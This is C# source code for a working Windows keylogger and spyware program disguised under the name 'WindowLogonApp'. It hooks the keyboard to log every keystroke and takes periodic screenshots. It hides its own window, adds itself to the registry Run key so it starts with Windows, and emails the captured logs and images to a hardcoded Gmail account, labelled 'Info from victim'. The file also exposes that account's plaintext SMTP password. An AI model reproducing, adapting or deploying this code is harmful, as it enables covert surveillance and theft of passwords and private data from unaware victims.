using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowLogonApp
{
    class Program
    {
        static string directoryTemp = @"C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split('\\')[1] + "\\AppData\\Local\\Temp\\Keylog\\";

        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                checkHotKey(vkCode);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = directoryTemp + logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys preKey = Keys.A;
        static Keys prepreKey = Keys.A;

        static void checkHotKey(int vkCode)
        {
            if (prepreKey == Keys.LControlKey && preKey == Keys.LShiftKey && (Keys)vkCode == Keys.RControlKey)
                isHotKey = true;
            if (isHotKey)
            {
                if (isShowing)
                {
                    HideWindow();
                }
                else
                    DisplayWindow();
                isShowing = !isShowing;
            }
            prepreKey = preKey;
            preKey = (Keys)vkCode;
            isHotKey = false;
        }
        #endregion

        #region region Windows

        #endregion

        #region Capture
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 1000;

        static void CaptureScreen()
        {
            //create a new bitmap
            var bmpScreenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height,
                                            PixelFormat.Format32bppArgb);
            //Create a graphics object from the bitmap
            var gfxScreenshot = Graphics.FromImage(bmpScreenShot);
            //take the screenshot from the upper left corner to the right bottom corner
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                            Screen.PrimaryScreen.Bounds.Y, 0, 0
                                            ,Screen.PrimaryScreen.Bounds.Size,
                                            CopyPixelOperation.SourceCopy);

            string directoryImage = directoryTemp + imagePath + DateTime.Now.ToLongDateString()+sentId;
            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            //Save the screenshot to the specified path that the user has choose.
            string imageName2 = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount + "+", imageExtendtion);
            try
            {
                bmpScreenShot = (Bitmap)ResizeByWidth(bmpScreenShot, 500);
                bmpScreenShot.Save(imageName2, ImageFormat.Png);

            }
            catch
            {

            }
            imageCount++;
        }
        #endregion

        #region Timmer
        static int interval = 1;
        static int sentId = 0;
        static void StartTimer()
        {
            Thread thread = new Thread(()=>
            {
                while(true)
                {
                    Thread.Sleep(1);
                    if(interval%captureTime==0)
                        CaptureScreen();
                    if (interval%mailTime == 0)
                    {
                        sendMail();
                        sentId++;
                        if(sentId%20==0)
                            DeleteAllFile();
                    }
                    interval++;
                    if (interval >= Int32.MaxValue - 1000)
                        interval = 1;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        #region Hiden Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        //hide window code
        const int SW_HIDE = 0;
        //show window code
        const int SW_SHOW = 1;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }
        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }

        #endregion

        #region Mail
        public static int mailTime = 5000;

        static void sendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpSever = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("nguyen.dang.tlu@gmail.com");
                mail.To.Add("nguyen.dang.tlu@gmail.com");
                mail.Subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name + "Keylogger data: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim\n";
                string logFile = directoryTemp + logName + DateTime.Now.ToLongDateString() + logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);
                    mail.Body += sr.ReadToEnd();
                    sr.Close();
                }

                string directoryImage = directoryTemp +  imagePath + DateTime.Now.ToLongDateString()+sentId;
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png")) 
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }
                smtpSever.Port = 587;
                smtpSever.Credentials = new NetworkCredential("nguyen.dang.tlu@gmail.com", "13121997");
                smtpSever.EnableSsl = true;
                smtpSever.Send(mail);

            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
        #endregion

        #region Registry that open with window
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\Listening");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyValue = "1";
            try
            {
                regkey.SetValue("Index", keyValue);
                regstart.SetValue("Listening", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch
            {

            }
        }
        #endregion

        #region Resize image
        public static Image ResizeByWidth(Image img, int width)
        {
            //Take width and height of image
            int originalW = img.Width;
            int originalH = img.Height;

            //New Width,Height
            int resizeW = width;
            int resizeH = (originalH * resizeW) / originalW;

            Bitmap bmp = new Bitmap(resizeW, resizeH);

            Graphics grp = Graphics.FromImage((Image)bmp);
            grp.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
            grp.DrawImage(img, 0, 0, resizeW, resizeH);

            grp.Dispose();

            return (Image)bmp;
        }
        #endregion

        #region Delete file sent already
        static void DeleteAllFile()
        {
            string preDirectoryCurrent = directoryTemp + imagePath + DateTime.Now.ToLongDateString() + (sentId-5);
            string directoryCurrent = directoryTemp + imagePath + DateTime.Now.ToLongDateString() + sentId;
            string[] direc = Directory.GetDirectories(directoryTemp);
            foreach(string item in direc)
            {
                try
                {
                    if (!item.Equals(directoryCurrent) && !item.Equals(preDirectoryCurrent))
                    {
                        string[] files = Directory.GetFiles(item);
                        foreach (string f in files)
                        {
                            File.Delete(f);
                        }
                        Directory.Delete(item);
                    }
                }
                catch
                {

                }
                
            }
        }
        #endregion
        static void Main(string[] args)
        {
            StartWithOS();
            if (!Directory.Exists(directoryTemp))
                Directory.CreateDirectory(directoryTemp);
            
            HideWindow();
            StartTimer();
            HookKeyboard();
        }
    }
}
